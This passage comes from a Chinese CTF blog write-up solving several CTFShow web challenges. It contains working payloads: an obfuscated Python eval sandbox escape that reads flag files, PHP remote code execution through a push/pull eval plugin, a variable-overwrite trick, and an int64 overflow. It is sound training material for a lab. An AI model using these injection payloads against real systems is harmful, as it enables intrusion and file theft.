class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>,debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>查看gmpy2库内的内容</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/8.png" class title="hwh"><p>builtins内一般有eval（ssti)</p><p>查看后确实有</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/9.png" class title="iwi"><p>只需要成功调用eval即可再次使用上一题的payload获取flag</p><p>也就是最终结果是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.__builtins__[eval](__import__(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python的字符串拼接又有如下规律（使用&#x27;+&#x27;拼接即可）</span><br><span class="line">&#x27;exp&#x27;[0]+&#x27;version&#x27;[0]+&#x27;asin&#x27;[0]+&#x27;polar&#x27;[2]</span><br><span class="line">--&gt;eval</span><br></pre></td></tr></table></figure><p>所以我们可以使用gmpy2库内的函数获取出所有的英文字母从而拼接出payload</p><p>（注意单引号需要使用双引号，就像这样    <strong>“'”</strong>）</p><p>经过不懈努力后得出如下payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gmpy2.__builtins__[&#x27;exp&#x27;[0]+&#x27;version&#x27;[0]+&#x27;asin&#x27;[0]+&#x27;polar&#x27;[2]](&#x27;const_pi&#x27;[5]+&#x27;const_pi&#x27;[5]+&#x27;version&#x27;[4]+&#x27;gamma&#x27;[2]+&#x27;exp&#x27;[2]+&#x27;version&#x27;[5]+&#x27;version&#x27;[2]+&#x27;atan&#x27;[1]+&#x27;const_pi&#x27;[5]+&#x27;const_pi&#x27;[5]+&#x27;(&#x27;+&quot;&#x27;&quot;+&#x27;version&#x27;[5]+&#x27;version&#x27;[3]+&quot;&#x27;&quot;+&#x27;)&#x27;+&#x27;.&#x27;+&#x27;polar&#x27;[0]+&#x27;polar&#x27;[1]+&#x27;polar&#x27;[0]+&#x27;exp&#x27;[0]+&#x27;version&#x27;[6]+&#x27;(&#x27;+&quot;&#x27;&quot;+&#x27;comb&#x27;[0]+&#x27;asin&#x27;[0]+&#x27;const_pi&#x27;[4]+&#x27; &#x27;+&#x27;/&#x27;+&#x27;inf&#x27;[2]+&#x27;*&#x27;+&quot;&#x27;&quot;+&#x27;)&#x27;+&#x27;.&#x27;+&#x27;version&#x27;[2]+&#x27;exp&#x27;[0]+&#x27;asin&#x27;[0]+&#x27;digamma&#x27;[0]+&#x27;()&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1><span id="is_not_obfuscate"> Is_Not_Obfuscate</span></h1><p>打开网页是一个push 和 pull的界面，首先查看源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;main&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Push or Pull<span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;ml6&quot;</span>&gt;</span>(最好用的开源插件社区)<span class="tag">&lt;/<span class="name">small</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;80&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;6&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;输入需要预览的插件名称&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- //测试执行加密后的插件代码 </span></span><br><span class="line"><span class="comment">   //这里只能执行加密代码，非加密代码不能执行</span></span><br><span class="line"><span class="comment">  eval(decode($_GET[&#x27;input&#x27;])); --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;button name=&quot;action&quot; value=&quot;test&quot;&gt; 执行 (do)&lt;/button&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pull&quot;</span>&gt;</span> 预览 (pull)<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;push&quot;</span>&gt;</span>贡献 (push)<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;output&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;80&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;6&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;help&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>您可以免费预览插件的源码与执行效果，也可以购买我们998$的解密器进行二次开发。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>您可以贡献代码给我们，我们可能会采纳，届时将提供奖励<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Test the lib.php before use the index.php！--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- After that,delete the robots.txt！--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现了一段被注释的内容：action=test的时候会执行内容</p><p>并且是eval执行</p><p>发现了lib.php和index.php</p><p>提示访问index.php前首先要测试lib.php</p><p>还有robots.txt</p><p>先访问robots.txt</p><p>发现/lib.php?flag=0，并且直接访问lib.php页面无内容</p><p>于是尝试将flag修改为1，回显出一套神秘代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eJwNkze2o0AABA9EAAI0gmADGGEGEE74DI/w3p1+/wX69euqzpVDJ2a/GkWO4z4QQpnTUq9P5fFd3Uu+YvM2ht+ZXSvYiLXq0o8zaUZ/KSKHeeauPge1HS1rQOaCRvmX5oevKRQajpkc1lMgFhD9uJCH4CSDtZnx8zALzJLhLR2K+WAbhIjf62yY9EFNAfOklJvHScguku8Y5yhtuZSeNGY1vr+NHn6Jn3MYCnm/z9GbI9TH0XZfPPoqqZRrKo48Gdz+odPf29M09uAXmYMftuX5lbIg586dsj8IPGvx3sRUZROiNLXSiM4s1dil6jpvB8cst8uk6ftkZcIF9tF4N0l7mIhew6On6LVPiWk7YaFYcBSI+CLjlUx0heeixgqiWcRtNyHMfs64sx7oVEPY4ZVZg/EmgnR+x6othXTZ2ZGQsEYvRa/U1LaK/4D7Op3ZKrKFnzAs01qSCbbf+P097nH5uUElYiGbytryRvxAe4t1V5PA2dkKlweEANhJ+DU5vzz0+doHA+3opUlU80ol9Ghxas7B3bayW892QCULlB3LuNEEaS2mp1LoXm8dTJAZgM3BGfCHNYbkODF0DqNXrFCMswdFjb9cCnMokKdNZnLUubhW0yA4h807ywaHFZvPxCuG05XdxV6nLiZapgdgHjFpXFbnrwz9LIzLCGMw+F7BHMJPheaGD3faUo71nCiV6QWQu0VW/O2DvG+eubaq5t1a5Y3tYJmti6soht26kuF7jUUg+vZz3guJPIhqEvujvCubvp9WFznqRBETu6RM8yssRUdkXOcelo3bvnM3onXcf9+kQvcSUbuwuEnWHYzn16/ewTo+gVIqv0+DNJC0YUGs9kWnS2+1sAvpdp6qe46VGHNv5Ehm8XNg9SPQyrFYwqRuQZZ/r2muD0WE4G5qRRQ8dnmkgxTVF7Zh61/yvmis14AVf3UwjoHywgVs7MNevg/tCL4JwsgHx6FLo0CANOoThXQcpMmu1ZcY+MB7L5c4S+5arvpFKn/GN4KvCEWYZ+r7inzI+ng3O1T0eaaqFmy63HfCz4xYWYn4PFjC7ukhBJfY7E+fPm6bO7/jSe+2SuGuZ5Crxj8yPiLLA1h61snzuxvqfM0ulqNmp/SzwQLyo5N5HVZEVzMdqY7RiEqT6/FOLji7N/7E3c+8ZLOGGQcDJMM5FARuDOfYyh09+M+I1Hdc+bCze4S0TuOa3j7orHPzP/BLQQLKt6c4cLZ42QbgJwmpowDmVjo/R6dyCuJbWwKGS8BVtzxfh2YhYu+r1n7mrY7nPTxszI6w/TWAErJEBVZwXlj33RDqfi+u45uVP292vZOCDP0RHKuVL20QeMwhqsY47fQ7ZuLeKP/9+w8pT7oT</span><br></pre></td></tr></table></figure><p>我也不懂什么东西，起初我还以为是base64，所以去用cyberchef搞了一下，发现不行</p><p>然后源码处知道将action设置为test后可以解密文件</p><p>于是将加密文本解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9eee1e16-a877-4e4e-a01b-0da514f9d5c2.challenge.ctf.show/?input=eJwNkze2o0AABA9EAAI0gmADGGEGEE74DI%2Fw3p1%2B%2FwX69euqzpVDJ2a%2FGkWO4z4QQpnTUq9P5fFd3Uu%2BYvM2ht%2BZXSvYiLXq0o8zaUZ%2FKSKHeeauPge1HS1rQOaCRvmX5oevKRQajpkc1lMgFhD9uJCH4CSDtZnx8zALzJLhLR2K%2BWAbhIjf62yY9EFNAfOklJvHScguku8Y5yhtuZSeNGY1vr%2BNHn6Jn3MYCnm%2Fz9GbI9TH0XZfPPoqqZRrKo48Gdz%2BodPf29M09uAXmYMftuX5lbIg586dsj8IPGvx3sRUZROiNLXSiM4s1dil6jpvB8cst8uk6ftkZcIF9tF4N0l7mIhew6On6LVPiWk7YaFYcBSI%2BCLjlUx0heeixgqiWcRtNyHMfs64sx7oVEPY4ZVZg%2FEmgnR%2Bx6othXTZ2ZGQsEYvRa%2FU1LaK%2F4D7Op3ZKrKFnzAs01qSCbbf%2BP097nH5uUElYiGbytryRvxAe4t1V5PA2dkKlweEANhJ%2BDU5vzz0%2BdoHA%2B3opUlU80ol9Ghxas7B3bayW892QCULlB3LuNEEaS2mp1LoXm8dTJAZgM3BGfCHNYbkODF0DqNXrFCMswdFjb9cCnMokKdNZnLUubhW0yA4h807ywaHFZvPxCuG05XdxV6nLiZapgdgHjFpXFbnrwz9LIzLCGMw%2BF7BHMJPheaGD3faUo71nCiV6QWQu0VW%2FO2DvG%2Beubaq5t1a5Y3tYJmti6soht26kuF7jUUg%2BvZz3guJPIhqEvujvCubvp9WFznqRBETu6RM8yssRUdkXOcelo3bvnM3onXcf9%2BkQvcSUbuwuEnWHYzn16%2FewTo%2BgVIqv0%2BDNJC0YUGs9kWnS2%2B1sAvpdp6qe46VGHNv5Ehm8XNg9SPQyrFYwqRuQZZ%2Fr2muD0WE4G5qRRQ8dnmkgxTVF7Zh61%2Fyvmis14AVf3UwjoHywgVs7MNevg%2FtCL4JwsgHx6FLo0CANOoThXQcpMmu1ZcY%2BMB7L5c4S%2B5arvpFKn%2FGN4KvCEWYZ%2Br7inzI%2Bng3O1T0eaaqFmy63HfCz4xYWYn4PFjC7ukhBJfY7E%2BfPm6bO7%2FjSe%2B2SuGuZ5Crxj8yPiLLA1h61snzuxvqfM0ulqNmp%2FSzwQLyo5N5HVZEVzMdqY7RiEqT6%2FFOLji7N%2F7E3c%2B8ZLOGGQcDJMM5FARuDOfYyh09%2BM%2BI1Hdc%2BbCze4S0TuOa3j7orHPzP%2FBLQQLKt6c4cLZ42QbgJwmpowDmVjo%2FR6dyCuJbWwKGS8BVtzxfh2YhYu%2Br1n7mrY7nPTxszI6w%2FTWAErJEBVZwXlj33RDqfi%2Bu45uVP292vZOCDP0RHKuVL20QeMwhqsY47fQ7ZuLeKP%2F9%2Bw8pT7oT&amp;action=test&amp;output=</span><br></pre></td></tr></table></figure><p>于是成功回显源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;lib.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;./plugins/&#x27;</span>))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;./plugins/&#x27;</span>, <span class="number">0777</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Test it and delete it ！！！</span></span><br><span class="line"><span class="comment">//测试执行加密后的插件代码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中最重要的就是下一段了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] === <span class="string">&#x27;test&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Anything is good?Please test it.&#x27;</span>;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;./plugins/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;pull&#x27;</span>:</span><br><span class="line">            <span class="variable">$output</span> = @<span class="keyword">eval</span>(<span class="title function_ invoke__">decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;input&#x27;</span>])));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;pull success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;push&#x27;</span>:</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./plugins/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>].<span class="string">&#x27;youyou&#x27;</span>), <span class="title function_ invoke__">encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;output&#x27;</span>]));</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;push success&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//action=push时，将output加密，并且写入一个文件名经过md5(output拼接youyou)</span></span><br><span class="line"><span class="comment">//action=pull时，eval解密后的内容</span></span><br></pre></td></tr></table></figure><p>于是我们可以output写入命令，然后进行push</p><p>然后使用pull操作访问这个文件，执行其中的命令</p><p>第一步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=&amp;action=push&amp;output=system(%27cat%20/f*%27);</span><br></pre></td></tr></table></figure><p>第二步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=1ce4b066a901b6cb2f7905584ff31ad4&amp;action=pull&amp;output=system(%27cat%20/f*%27);</span><br></pre></td></tr></table></figure><p>其中<code>1ce4b066a901b6cb2f7905584ff31ad4</code>是<code>system('cat /f*');youyou</code>的md5值</p><p>就能获得flag</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/11.png" class title="kwk"><h1><span id="easypython_p"> easyPytHon_P</span></h1><p>直接给出源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">cmd: <span class="built_in">str</span> = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">param: <span class="built_in">str</span> = request.form.get(<span class="string">&#x27;param&#x27;</span>)</span><br><span class="line"><span class="comment"># ------------------------------------- Don&#x27;t modify ↑ them ↑! But you can write your code ↓</span></span><br><span class="line"><span class="keyword">import</span> subprocess, os</span><br><span class="line"><span class="keyword">if</span> cmd <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> param <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tVar = subprocess.run([cmd[:<span class="number">3</span>], param, __file__], cwd=os.getcwd(), timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.TimeoutExpired:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Timeout!&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No Flag!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>值得注意的就是：</p><p><code>request.form.get</code>说的是虽然是get，但是其实使用post方式提交的</p><p>真蛋疼啊…</p><p>然后就是这个<code>subprocess.run()</code>了，它是用于执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例</p><p>函数参数：</p><p><code>subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, shell=False, timeout=None, check=False, universal_newlines=False)</code></p><p>args：默认是字符串序列</p><p>也可以是一个字符串，但是此时要将shell参数设置为true</p><p>shell：如果为true，则命令将会通过shell执行</p><p>check：检查异常</p><p>举个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>subprocess.run([<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;dev/null&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">CompletedProcess(args=[<span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;dev/null&#x27;</span>], returncode=<span class="number">0</span>, stdout=<span class="string">b&#x27;crw-rw-rw- 1 root root 1, 3 Jan 23 16:23 /dev/null\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>从这里我们就可以知道这些个字符串需要分开</p><p>也就是我们想要执行<code>ls -l</code> 就需要分开传递<code>ls</code> 和<code>-l</code></p><p>所以就是换个方式来执行命令</p><p>POST方式传入：<code>cmd=ls&amp;param=/</code></p><p>查看根目录下是否有flag</p><p>发现没有，所以flag应该在当前目录<code>/app</code>下</p><p>经过测试发现如果param为空无回显</p><p>所以我们传入<code>cmd=ls&amp;param=/app</code>查看/app下的文件</p><p>发现flag.txt</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/12.png" class title="lwl"><p>直接<code>cat</code> <code>flag.txt</code>即可</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/13.png" class title="mwm"><h1><span id="满地飘零"> 满地飘零</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$zeros</span>=<span class="string">&quot;000000000000000000000000000000&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="comment">//覆盖变量，举例：</span></span><br><span class="line"><span class="comment">//传入flag=awa  此时$$key=$$value 就会使得$flag=$awa</span></span><br><span class="line"><span class="comment">//如果$awa=flag&#123;xxxxxxx&#125;此时flag的值就会变为flag&#123;xxxxxxx&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$flag</span>==<span class="string">&quot;000000000000000000000000000000&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;好多零&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有零，仔细看看输入有什么问题吧&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但事实呢，这题考的不是变量覆盖，因为如果你传值<code>?flag=zeros</code>的时候就只会echo “好多零”，而且flag原本的值也被覆盖了</p><p>我们知道$号后面是变量名</p><p>那么<code>$_GET</code>呢？ 那么我们是不是可以这样理解：<code>$_GET</code>不仅仅是GET传参，还可以是个变量名<code>_GET</code>？</p><p>那么我们如果传入<code>_GET=flag</code>的话</p><p>那么<code>$_GET=$flag</code></p><p>而且没有进入好多零，而是<code>var_dump()</code>，就能获得flag了</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/14.png" class title="nwn"><h1><span id="茶歇区"> 茶歇区</span></h1><p>int64溢出<br>消耗fp得到物品</p><p>每一件物品有不同的分数</p><img src="/2023/01/29/CTFShow-%E8%8F%9C%E7%8B%97%E6%9D%AF/15.png" class title="owo"><p>消耗的fp值超过你有的fp值的时候就会回显你不好意思拿那么多…</p><p>那么如果我们硬要拿很多的话，就会使得扣除的分数溢出，导致无法处理（</p><p>int 64 : 9223372036854775807</p><p>如果我们超过了这个数字，int就无法处理了</p><p>然后就是试错，拿咖啡试是最好的，因为他是x10</p><p>矿泉水是无法触发溢出的，因为x1</p><p>我们试试</p><p>9223372036854775807</p><p>发现我们获得了0分</p><p>这个时候就是溢出太大了（</p><p>我们调整一下</p><p>932337203685477580</p><p>这样恰好溢出不会太大</p><p><code>操作成功：你拿了932337203685477580瓶咖啡，总计获得-9123372036854775808分!</code></p><p>回显成功，再传一次<code>932337203685477580</code>即可获得flag</p><p>感觉怪怪的，说不太清</p><p><code>恭喜你获得flag：ctfshow&#123;4d69f484-1089-4e02-8437-9726728942bd&#125;</code></p><h1><span id="无一幸免_fixed"> 无一幸免_FIXED</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span 